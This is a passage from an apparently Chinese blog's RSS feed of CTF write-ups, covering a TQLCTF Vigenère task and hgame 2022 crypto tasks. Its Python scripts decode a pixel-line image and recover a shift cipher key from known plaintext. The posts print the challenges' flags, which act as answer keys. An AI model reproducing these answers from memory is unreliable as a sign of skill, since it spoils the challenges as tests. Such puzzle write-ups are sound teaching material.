class=&#34;number&#34;&gt;4&lt;/span&gt;:]+(y[i+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;])[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(y)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;0b&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; y[i]: &lt;span class=&#34;comment&#34;&gt;# 去除多余项并合并&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		z.append(y[i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.join(z))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 得到：&lt;/p&gt;
&lt;blockquote QFOLP6_KRZ1Q=&#34;&#34;&gt;
&lt;p&gt;KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj&#39;o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;观察猜测是维吉尼亚加密，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;直接爆破 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGNvZGUuZnIvdmlnZW5lcmUtY2lwaGVy&#34;&gt;在线网址&lt;/span&gt; ：&lt;br /&gt;
点击 AUTOMATIC DECRYPTION，爆破即可&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看官方 wp，（这个密钥要拿到脑洞也太大了吧。。。）&lt;br /&gt;
依次列举出 UTF-8 编码文字的长度，长度为 1 的字符转换为&lt;strong&gt;点&lt;/strong&gt;，长度为 2 的字符转换为&lt;strong&gt;线&lt;/strong&gt;，长度为 3 的字符转换成&lt;strong&gt;分隔符&lt;/strong&gt;，经过 &lt;strong&gt;Morse&lt;/strong&gt; 解读获得密钥&lt;br /&gt;
 (￣▽￣)&amp;quot;&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682438209/Typera/2023/04/150cd961046421d365382e0994f34fba.png&#34; alt=&#34;image-20230425235644738&#34; /&gt;&lt;br /&gt;
flag： &lt;code&gt;TQLCTF&amp;#123;CODIN6_WOR1D&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/</guid>
            <title>2022hgame week1</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/2022hgame-week1/</link>
            <category>Python</category>
            <category>Crypto</category>
            <category>CTF</category>
            <category>Misc</category>
            <pubDate>Sat, 05 Feb 2022 15:46:27 +1100</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h2&gt;
&lt;h3 id=&#34;dancing_line&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dancing_line&#34;&gt;#&lt;/a&gt; Dancing_Line&lt;/h3&gt;
&lt;p&gt;有点靠脑洞啊，这道 crypto 不讲武德 /_ \ ，不过仔细看看还是大概能猜到的～&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437580/Typera/2023/04/d902f3ec8dfa08547fca2ab2f0d0f237.bmp&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
图片上有一条线，放大可以看出，每隔一小段会有一个黑点&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437729/Typera/2023/04/f02b3b2084d99f2b7639a572df5b0d8a.png&#34; alt=&#34;image-20230425234706530&#34; /&gt;&lt;br /&gt;
 所以，我用 python PIL 库写个脚本导出黑点的坐标&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img=Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./Dancing_Line.bmp&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;w,h=img.size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(w,h)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(w):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(h):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; img.getpixel((i,j))!=(&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; img.getpixel((i,j))==(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				pos.append((i,j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pos)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 得到如下字串：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[(0, 0), (5, 3), (8, 8), (13, 11), (16, 16), (20, 20), (22, 26), (28, 28), (33, 31), (36, 36), (40, 40), (45, 43), (48, 48), (51, 53), (53, 59), (58, 62), (63, 65), (66, 70), (70, 74), (72, 80), (77, 83), (81, 87), (83, 93), (87, 97), (90, 102), (93, 107), (98, 110), (100, 116), (105, 119), (109, 123), (112, 128), (116, 132), (120, 136), (122, 142), (127, 145), (131, 149), (133, 155), (135, 161)]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;仔细找找规律可以发现，相邻黑点坐标之差均为 8&lt;br /&gt;
 同理导出线上所有点的坐标，不难看出，相邻点的坐标，要么是横坐标加 1，要么是纵坐标加 1，&lt;/p&gt;
&lt;p&gt;再结合相邻黑点坐标差为 8 这个数字，所以推测这应该是一个二进制编码 （。＾▽＾）&lt;br /&gt;
几番尝试之后确定为，纵坐标增长为 1，横坐标增长为 0&lt;/p&gt;
&lt;p&gt;最后将二进制转换为 ASCII 码，即可得到 flag&lt;/p&gt;
&lt;p&gt;完整 exp 如下：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img=Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./Dancing_Line.bmp&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;w,h=img.size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(w,h)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_all=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;t=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(w):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(h):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; img.getpixel((i,j))!=(&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; img.getpixel((i,j))==(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				pos.append((i,j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			pos_all.append((i,j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(pos)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(pos_all)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; k &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(pos_all)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; pos_all[k][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]-pos_all[k-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		t=t+&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; pos_all[k][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]-pos_all[k-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		t=t+&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;t=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(t,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(t.to_bytes((t.bit_length() + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) // &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;big&amp;#x27;&lt;/span&gt;).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;english-novel&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#english-novel&#34;&gt;#&lt;/a&gt; English Novel&lt;/h3&gt;
&lt;p&gt;做是做出来了，就是原来写的脚本稀烂，由于标点符号的原因，整理出来的 keys，有些地方不太对，这就导致我最开始写的脚本，得到的 flag 其实是长这样的： &lt;code&gt;hgame&amp;#123;V0_y0u_kn0w_&#39;En0wn-pla1ntext_derzwn&#39;?&amp;#125;&lt;/code&gt; &lt;br /&gt;
(￣▽￣)&amp;quot;&lt;/p&gt;
&lt;p&gt;然后我直接猜出最终的 flag... 讲真挺好猜的&lt;br /&gt;
不过看过别人的 wp 之后，我就在原基础上改善了（现在没问题了）&lt;/p&gt;
&lt;p&gt;这道题思路其实很简单，&lt;br /&gt;
题目给了我们两个文件夹，一个 original，一个 encrypt，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1mbGFnLWs4NGZ1aTB3eDYwMmEyNzVhLnhuLS1lbmNlbmNyeXB0LWpoN3EucHk=&#34;&gt;还给了一个 flag.enc 和 encrypt.py&lt;/span&gt;&lt;br /&gt;
 首先都打开来看看，original 里面是打乱的 English Novel 的原文，encrypt 里面大概就是通过某种加密得到的打乱的密文，flag.enc 里面大概就是用同样方法加密得到的 flag， encrypt.py 就是加密的方法&lt;/p&gt;
&lt;p&gt;打开 encrypt.py 看看，其实就是 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;26&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;c=(m+k) mod 26&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.4306em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;26&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;
 那解密就是 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;26&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;m=(c-k) mod 26&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.4306em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;26&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; （c 为密文，m 为明文，k 为密钥）&lt;br /&gt;
所以显然我们的任务就是得到这个密钥 k，然后解密 flag.enc 里的密文&lt;/p&gt;
&lt;p&gt;而题目把一大堆明文和密文都给我们了，所以就是已知明文攻击，&lt;br /&gt;
所以， &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;26&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k=(c-m) mod 26&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;26&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;
 关键点就在怎么把打乱 encrypt 和 original 一一对应起来，而且要排除标点符号对求 key 的干扰&lt;br /&gt;
因为仔细看 encrypt.py 的话，标点符号虽然不会参与加密，但是还是会占据一个 key 的位置&lt;/p&gt;
&lt;p&gt;用 isalpha () 的功能判断字母，然后把字母替换成 &amp;quot;*&amp;quot;，保留标点符号，这样得到的字符串相当于一个标准的模板，对于对应的 original 和 encrypt 来说，他们的 template 都是一样的，这样就能把原文和密文对应起来。&lt;br /&gt;
找到了对应的原文和密文，解得正确的 key 就比较容易了（不过要记得排除标点符号的干扰）&lt;br /&gt;
exp 如下：&lt;br /&gt;
